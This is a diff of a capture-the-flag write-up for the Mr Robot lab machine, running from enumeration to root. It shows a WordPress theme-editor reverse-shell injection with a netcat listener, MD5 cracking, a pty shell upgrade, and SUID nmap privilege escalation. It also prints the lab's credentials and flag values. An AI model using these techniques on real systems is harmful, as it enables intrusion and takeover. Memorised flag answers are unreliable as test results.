@@ -13,6 +13,7 @@ A: 04787ddef27c3dee1ee161b21670b4e4
 ---
 # WORKING
 
+## NMAP
 
 ```
 └──╼ $sudo nmap -O --osscan-guess -sV -p- MACHINE.IP 
@@ -60,8 +61,15 @@ Nmap done: 1 IP address (1 host up) scanned in 839.09 seconds
            Raw packets sent: 131585 (5.794MB) | Rcvd: 615 (28.220KB)
 ```
 
-Dirbuster
-php, html, js, css, py, jsp, asp, phtml, jpg, png, txt
+## Directory Traversal
+
+Using `Dirbuster` to scan directories and files with the following extensions:
+> php, html, js, css, py, jsp, asp, phtml, jpg, png, txt
+
+
+Other than that we can also look for robots.txt file to see if there're any restricted files or directories
+
+### Our first key
 
 https://MACHINE.IP/robots.txt
 ```
@@ -70,37 +78,73 @@ fsocity.dic
 key-1-of-3.txt
 ```
 
-http://MACHINE.IP/license.txt
+Two files:
+- key-1-of-3.txt: gave us our first key, go to https://MACHINE.IP/key-1-of-3.txt
+- fsocity.dic: gave us a wordlist which might come in handy later on.
+
+### Files of focus
+
+For our directory traversal, we got a lot of directories and files, but we'll focus on the follow:
+- license.txt
+- /wp-admin
+
+Upon visiting http://MACHINE.IP/license.txt , we got some messages(text) on the web page, and if scrolled down to the bottom we got a base64 hash, let's decode it.
+
 $echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
 elliot:ER28-0652
 
-https://MACHINE.IP/wp-admin/theme-editor.php?file=header.php&theme=twentyfifteen
+## Web Interaction
 
+Seems like a password, now let's visit the admin page (http://MACHINE.IP/wp-admin) we discovered earlier. Here it is asking for username password, just provide the above credentials and you should get in.
+
+Since this is a wordpress site, we can look for a way to upload a file or put our rev-shell code to get terminal access. For this, 
+- go to theme editor.
+- select header.php (as this will get loaded everytime admin login in)
+- copy paste the php reverse shell code by [pentest-monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+## Reverse Shell
+
+Initiate a netcat listner in terminal:
+```
+└──╼ $nc -lnvp 6565
+```
+
+Here, it got a bit confusing for me as how to initiate our php code after modifying the header file, so we can still forcefully execute it by putting the following url in the browser:
 
 https://MACHINE.IP/wp-admin/header.php
 
-```
-└──╼ $nc -lnvp 6565
-...
+### Machine Exploration
 
+We got the shell, now let's do some exploration as how many users are there and what file do they have:
+
+```
 daemon@linux:/$ ls /home
 ls /home
 robot
+
 daemon@linux:/$ ls /home/robot
 ls /home/robot
 key-2-of-3.txt
 password.raw-md5
+
 daemon@linux:/$ ls -l /home/robot
 ls -l /home/robot
 total 8
 -r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
 -rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
+
 daemon@linux:/$ cat /home/robot/password.raw-md5
 cat /home/robot/password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
+
 daemon@linux:/$ 
 ```
 
+### Password Cracking
+
+Here, we can read the password from the file for user `robot` but its a hash, and upon inspecting, it's a raw md5 hash, let's crack it using John-The-Ripper
+
+For wordlist, we will use the one we got earlier.
 
 ```
 $john --format=raw-md5 key2md5pass.txt --wordlist=../Other_Files/fsocity.txt
@@ -112,16 +156,24 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Session completed. 
 ```
 
+### Switching to User `robot`
+
+Okay!, we got the password for user `robot`, now let's switch to robot
+
 ```
 daemon@linux:/$ su robot
 su robot
 su: must be run from a terminal
 ```
 
+Oops, something is wrong here, we need to upgrade our shell, just run the following python code:
+
 ```
 daemon@linux:~$ python -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
+
+Let's try switching user one more time:
 
 ```
 daemon@linux:~$ su robot
@@ -130,6 +182,10 @@ Password: abcdefghijklmnopqrstuvwxyz
 
 robot@linux:/usr/sbin$ 
 ```
+
+### Obtaining the second key:
+
+It worked!!, now let's go and read the key file and get our second key:
 
 ```
 robot@linux:/usr/sbin$ cd
@@ -142,6 +198,10 @@ cat key-2-of-3.txt
 robot@linux:~$ 
 ```
 
+## Privilege Escalation
+
+Now for escalating our privileges, we'll check what programs can we run as sudo:
+
 ```
 robot@linux:~$ sudo -l
 sudo -l
@@ -149,6 +209,8 @@ sudo -l
 
 Sorry, user robot may not run sudo on linux.
 ```
+
+Okay, if user cannot run as sudo then let's search for programs that have suid set as root and can be run by any user:
 
 ```
 robot@linux:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
@@ -183,15 +245,16 @@ robot@linux:/$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \
 -rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
 ```
 
+In the list, there's one item that is a bit odd, `nmap`.
+
+Nmap has a suid bit set as root, and we know nmap provide an interactive mode in which we can run shell commands, let's use it and get our final key.
+
 ```
 robot@linux:~$ nmap --interactive
 nmap --interactive
 
 Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
-nmap> whoami
-whoami
-Unknown command (whoami) -- press h <enter> for help
 nmap> !whoami
 !whoami
 root
@@ -208,3 +271,5 @@ firstboot_done	key-3-of-3.txt
 cat /root/key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
 ```
+
+Although the user id was of robot but in this interactive shell the effective user id was of root, that's why we were able to read the file as root.
